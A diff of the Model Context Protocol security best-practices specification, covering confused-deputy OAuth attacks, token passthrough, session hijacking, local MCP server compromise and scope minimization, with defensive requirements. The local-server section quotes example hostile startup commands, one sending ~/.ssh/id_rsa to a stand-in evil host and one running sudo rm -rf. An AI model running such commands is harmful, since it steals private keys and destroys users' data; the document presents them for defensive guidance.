@@ -8,7 +8,7 @@ title: Security Best Practices
 
 ### Purpose and Scope
 
-This document provides security considerations for the Model Context Protocol (MCP), complementing the MCP Authorization specification. This document identifies security risks, attack vectors, and best practices specific to MCP implementations.
+This document provides security considerations for the Model Context Protocol (MCP), complementing the [MCP Authorization](../basic/authorization.mdx) specification. This document identifies security risks, attack vectors, and best practices specific to MCP implementations.
 
 The primary audience for this document includes developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems. This document should be read alongside the MCP Authorization specification and [OAuth 2.0 security best practices](https://datatracker.ietf.org/doc/html/rfc9700).
 
@@ -18,7 +18,7 @@ This section gives a detailed description of attacks on MCP implementations, alo
 
 ### Confused Deputy Problem
 
-Attackers can exploit MCP servers proxying other resource servers, creating "[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)" vulnerabilities.
+Attackers can exploit MCP proxy servers that connect to third-party APIs, creating "[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)" vulnerabilities. This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies.
 
 #### Terminology
 
@@ -26,7 +26,7 @@ Attackers can exploit MCP servers proxying other resource servers, creating "[co
 : An MCP server that connects MCP clients to third-party APIs, offering MCP features while delegating operations and acting as a single OAuth client to the third-party API server.
 
 **Third-Party Authorization Server**
-: Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring MCP proxy to use a static client ID for all requests.
+: Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring the MCP proxy to use a static client ID for all requests.
 
 **Third-Party API**
 : The protected resource server that provides the actual API functionality. Access to this
@@ -37,6 +37,15 @@ API requires tokens issued by the third-party authorization server.
 the third-party authorization server. This Client ID refers to the MCP server acting as a client
 to the Third-Party API. It is the same value for all MCP server to Third-Party API interactions regardless of
 which MCP client initiated the request.
+
+#### Vulnerable Conditions
+
+This attack becomes possible when all of the following conditions are present:
+
+- MCP proxy server uses a **static client ID** with a third-party authorization server
+- MCP proxy server allows MCP clients to **dynamically register** (each getting their own client_id)
+- The third-party authorization server sets a **consent cookie** after the first authorization
+- MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization
 
 #### Architecture and Attack Flows
 
@@ -99,8 +108,7 @@ sequenceDiagram
 #### Attack Description
 
 When an MCP proxy server uses a static client ID to authenticate with a third-party
-authorization server that does not support dynamic client registration, the following
-attack becomes possible:
+authorization server, the following attack becomes possible:
 
 1. A user authenticates normally through the MCP proxy server to access the third-party API
 2. During this flow, the third-party authorization server sets a cookie on the user agent
@@ -108,18 +116,111 @@ attack becomes possible:
 3. An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID
 4. When the user clicks the link, their browser still has the consent cookie from the previous legitimate request
 5. The third-party authorization server detects the cookie and skips the consent screen
-6. The MCP authorization code is redirected to the attacker's server (specified in the crafted redirect_uri during dynamic client registration)
+6. The MCP authorization code is redirected to the attacker's server (specified in the malicious `redirect_uri` parameter during [dynamic client registration](/specification/draft/basic/authorization#dynamic-client-registration))
 7. The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval
-8. Attacker now has access to the third-party API as the compromised user
+8. The attacker now has access to the third-party API as the compromised user
 
 #### Mitigation
 
-MCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically
-registered client before forwarding to third-party authorization servers (which may require additional consent).
+To prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below.
+
+##### Consent Flow Implementation
+
+The following diagram shows how to properly implement per-client consent that runs **before** the third-party authorization flow:
+
+```mermaid
+sequenceDiagram
+    participant Client as MCP Client
+    participant Browser as User's Browser
+    participant MCP as MCP Server
+    participant ThirdParty as Third-Party AuthZ Server
+
+    Note over Client,ThirdParty: 1. Client Registration (Dynamic)
+    Client->>MCP: Register with redirect_uri
+    MCP-->>Client: client_id
+
+    Note over Client,ThirdParty: 2. Authorization Request
+    Client->>Browser: Open MCP server authorization URL
+    Browser->>MCP: GET /authorize?client_id=...&redirect_uri=...
+
+    alt Check MCP Server Consent
+        MCP->>MCP: Check consent for this client_id
+        Note over MCP: Not previously approved
+    end
+
+    MCP->>Browser: Show MCP server-owned consent page
+    Note over Browser: "Allow [Client Name] to access [Third-Party API]?"
+    Browser->>MCP: POST /consent (approve)
+    MCP->>MCP: Store consent decision for client_id
+
+    Note over Client,ThirdParty: 3. Forward to Third-Party
+    MCP->>Browser: Redirect to third-party /authorize
+    Note over MCP: Use static client_id for third-party
+
+    Browser->>ThirdParty: Authorization request (static client_id)
+    ThirdParty->>Browser: User authenticates & consents
+    ThirdParty->>Browser: Redirect with auth code
+
+    Browser->>MCP: Callback with third-party code
+    MCP->>ThirdParty: Exchange code for token (using static client_id)
+    MCP->>Browser: Redirect to client's registered redirect_uri
+```
+
+##### Required Protections
+
+**Per-Client Consent Storage**
+
+MCP proxy servers **MUST**:
+
+- Maintain a registry of approved `client_id` values per user
+- Check this registry **before** initiating the third-party authorization flow
+- Store consent decisions securely (server-side database, or server specific cookies)
+
+**Consent UI Requirements**
+
+The MCP-level consent page **MUST**:
+
+- Clearly identify the requesting MCP client by name
+- Display the specific third-party API scopes being requested
+- Show the registered `redirect_uri` where tokens will be sent
+- Implement CSRF protection (e.g., state parameter, CSRF tokens)
+- Prevent iframing via `frame-ancestors` CSP directive or `X-Frame-Options: DENY` to prevent clickjacking
+
+**Consent Cookie Security**
+
+If using cookies to track consent decisions, they **MUST**:
+
+- Use `__Host-` prefix for cookie names
+- Set `Secure`, `HttpOnly`, and `SameSite=Lax` attributes
+- Be cryptographically signed or use server-side sessions
+- Bind to the specific `client_id` (not just "user has consented")
+
+**Redirect URI Validation**
+
+The MCP proxy server **MUST**:
+
+- Validate that the `redirect_uri` in authorization requests exactly matches the registered URI
+- Reject requests if the `redirect_uri` has changed without re-registration
+- Use exact string matching (not pattern matching or wildcards)
+
+**OAuth State Parameter Validation**
+
+The OAuth `state` parameter is critical to prevent authorization code interception and CSRF attacks. Proper state validation ensures that consent approval at the authorization endpoint is enforced at the callback endpoint.
+
+MCP proxy servers implementing OAuth flows **MUST**:
+
+- Generate a cryptographically secure random `state` value for each authorization request
+- Store the `state` value server-side (in a secure session store or encrypted cookie) **only after** consent has been explicitly approved
+- Set the `state` tracking cookie/session **immediately before** redirecting to the third-party identity provider (not before consent approval)
+- Validate at the callback endpoint that the `state` query parameter exactly matches the stored value in the callback request's cookies or in the request's cookie-based session
+- Reject any callback requests where the `state` parameter is missing or does not match
+- Ensure `state` values are single-use (delete after validation) and have a short expiration time (e.g., 10 minutes)
+
+The consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server's authorization endpoint. Setting this cookie before consent approval renders the consent screen ineffective, as an attacker could bypass it by crafting a malicious authorization request.
 
 ### Token Passthrough
 
-"Token passthrough" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued _to the MCP server_ and "passing them through" to the downstream API.
+"Token passthrough" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued _to the MCP server_ and passes them through to the downstream API.
 
 #### Risks
 
@@ -198,7 +299,6 @@ When you have multiple stateful HTTP servers that handle MCP requests, the follo
 
 1. The client connects to **Server A** and receives a session ID.
 1. The attacker obtains an existing session ID and sends a malicious event to **Server B** with said session ID.
-
    - When a server supports [redelivery/resumable streams](/specification/draft/basic/transports#resumability-and-redelivery), deliberately terminating the request before receiving the response could lead to it being resumed by the original client via the GET request for server sent events.
    - If a particular server initiates server sent events as a consequence of a tool call such as a `notifications/tools/list_changed`, where it is possible to affect the tools that are offered by the server, a client could end up with tools that they were not aware were enabled.
 
@@ -228,3 +328,111 @@ MCP servers **SHOULD** bind session IDs to user-specific information.
 When storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.
 
 MCP servers can optionally leverage additional unique identifiers.
+
+### Local MCP Server Compromise
+
+Local MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.
+
+#### Attack Description
+
+Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:
+
+1. An attacker includes a malicious "startup" command in a client configuration
+2. An attacker distributes a malicious payload inside the server itself
+3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding
+
+Example malicious startup commands that could be embedded:
+
+```bash
+# Data exfiltration
+npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
+
+# Privilege escalation
+sudo rm -rf /important/system/files && echo "MCP server installed!"
+```
+
+#### Risks
+
+Local MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:
+
+- **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.
+- **No visibility**. Users have no insight into what commands are being executed.
+- **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.
+- **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.
+- **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.
+
+#### Mitigation
+
+If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.
+
+**Pre-Configuration Consent**
+
+Display a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:
+
+- Show the exact command that will be executed, without truncation (include arguments and parameters)
+- Clearly identify it as a potentially dangerous operation that executes code on the user's system
+- Require explicit user approval before proceeding
+- Allow users to cancel the configuration
+
+The MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:
+
+- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)
+- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)
+- Warn that MCP servers run with the same privileges as the client
+- Execute MCP server commands in a sandboxed environment with minimal default privileges
+- Launch MCP servers with restricted access to the file system, network, and other system resources
+- Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed
+- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)
+
+MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:
+
+- Use the `stdio` transport to limit access to just the MCP client
+- Restrict access if using an HTTP transport, such as:
+  - Require an authorization token
+  - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access
+
+### Scope Minimization
+
+Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails.
+
+#### Attack Description
+
+An attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.
+
+#### Risks
+
+- Expanded blast radius: stolen broad token enables unrelated tool/resource access
+- Higher friction on revocation: revoking a max-privilege token disrupts all workflows
+- Audit noise: single omnibus scope masks user intent per operation
+- Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts
+- Consent abandonment: users decline dialogs listing excessive scopes
+- Scope inflation blindness: lack of metrics makes over-broad requests normalised
+
+#### Mitigation
+
+Implement a progressive, least-privilege scope model:
+
+- Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations
+- Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges when privileged operations are first attempted
+- Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes
+
+Server guidance:
+
+- Emit precise scope challenges; avoid returning the full catalog
+- Log elevation events (scope requested, granted subset) with correlation IDs
+
+Client guidance:
+
+- Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)
+- Cache recent failures to avoid repeated elevation loops for denied scopes
+
+#### Common Mistakes
+
+- Publishing all possible scopes in `scopes_supported`
+- Using wildcard or omnibus scopes (`*`, `all`, `full-access`)
+- Bundling unrelated privileges to preempt future prompts
+- Returning entire scope catalog in every challenge
+- Silent scope semantic changes without versioning
+- Treating claimed scopes in token as sufficient without server-side authorization logic
+
+Proper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.
